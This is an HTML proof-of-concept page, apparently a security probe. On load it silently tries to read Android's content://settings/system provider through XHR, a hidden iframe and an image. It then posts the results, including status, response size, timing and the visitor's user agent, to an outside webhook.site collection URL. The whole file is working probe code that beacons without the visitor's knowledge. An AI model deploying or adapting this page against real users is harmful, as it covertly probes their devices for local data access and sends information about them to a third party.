<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Content URI Behavior Test</title>
</head>
<body>
<h3>Testing content:// behavior...</h3>

<script>
const CONFIG = {
    TARGET: "content://settings/system",
    CONTROL: "https://example.com/",
    WEBHOOK: "https://webhook.site/893cc168-9c2c-409a-9c79-771f7d62bf3d"
};

function report(data) {
    fetch(CONFIG.WEBHOOK, {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify({
            time: Date.now(),
            ua: navigator.userAgent,
            ...data
        })
    });
}

function testXHR(url, label) {
    const start = performance.now();
    const xhr = new XMLHttpRequest();

    xhr.open("GET", url, true);
    xhr.responseType = "blob";

    xhr.onloadend = function() {
        report({
            type: "XHR",
            label: label,
            url: url,
            status: xhr.status,
            duration: performance.now() - start,
            size: xhr.response ? xhr.response.size : 0
        });
    };

    xhr.onerror = function(e) {
        report({
            type: "XHR_ERROR",
            label: label,
            url: url,
            error: e.toString()
        });
    };

    try {
        xhr.send();
    } catch (e) {
        report({
            type: "XHR_EXCEPTION",
            label: label,
            url: url,
            error: e.toString()
        });
    }
}

function testIframe(url, label) {
    const iframe = document.createElement("iframe");
    iframe.style.display = "none";

    iframe.onload = () => report({ type: "IFRAME_LOAD", label, url });
    iframe.onerror = () => report({ type: "IFRAME_ERROR", label, url });

    iframe.src = url;
    document.body.appendChild(iframe);
}

function testImage(url, label) {
    const img = new Image();

    img.onload = () => report({ type: "IMG_LOAD", label, url });
    img.onerror = () => report({ type: "IMG_ERROR", label, url });

    img.src = url;
}

window.onload = () => {
    // TARGET (content://)
    testXHR(CONFIG.TARGET, "TARGET");
    testIframe(CONFIG.TARGET, "TARGET");
    testImage(CONFIG.TARGET, "TARGET");

    // CONTROL (https://)
    testXHR(CONFIG.CONTROL, "CONTROL");
    testIframe(CONFIG.CONTROL, "CONTROL");
    testImage(CONFIG.CONTROL, "CONTROL");
};
</script>

</body>
</html>
